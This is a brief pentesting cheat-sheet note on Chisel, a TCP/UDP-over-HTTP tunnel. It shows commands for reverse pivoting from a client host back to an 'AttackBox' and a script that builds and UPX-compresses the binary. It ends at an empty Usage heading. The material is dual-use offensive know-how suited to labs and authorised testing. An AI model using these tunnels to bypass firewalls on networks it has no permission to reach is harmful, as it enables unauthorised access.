# Chisel

[Chisel](https://github.com/jpillora/chisel.git) *"is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network."*

## Reverse Pivot with Chisel Explain:
Chisel is useful when you can not port forward with ssh. You would then need chisel for reverse pivoting, which is the reverse of port forward as the  **Remote box is listening** to connect back the attack to open up the tunnel. For information about [[Port-Redirection-And-Tunneling]].

```bash
# AttackBox
chisel server -p 8000 -reverse # -v is useful for checking connection 
# Client
chisel client $attackboxIP:8000 R:8001:$clientip:$port
# Accessing through the tunnel on Attackbox
curl 127.0.0.1:8001 # will then access $clientip:$port
```


## Compilation and Shrinking the binary

```bash
#!/bin/bash
git clone https://github.com/jpillora/chisel.git 
cd chisel/
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation
go build -ldflags="-s -w"
upx brute chisel
chiselsize=$(du -hs chisel)
echo "Chisel is now ready and minimised: "
echo $chiselsize
```

## Usage